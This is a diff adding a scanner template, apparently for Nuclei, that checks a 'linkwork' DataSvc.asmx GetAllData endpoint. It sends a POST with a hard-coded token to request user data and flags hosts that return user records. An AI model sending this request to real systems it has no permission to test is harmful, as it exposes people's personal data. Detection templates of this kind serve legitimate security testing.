@@ -1,0 +1,27 @@
+id: linkwork-DataSvc-GetAllData
+
+info:
+  name: linkwork-DataSvc-GetAllData
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; SM-P585Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        Token=!@#$asdf$#@!&DataType=user
+
+    max-size: 1000
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'<?xml','NewDataSet','USR_CODE')
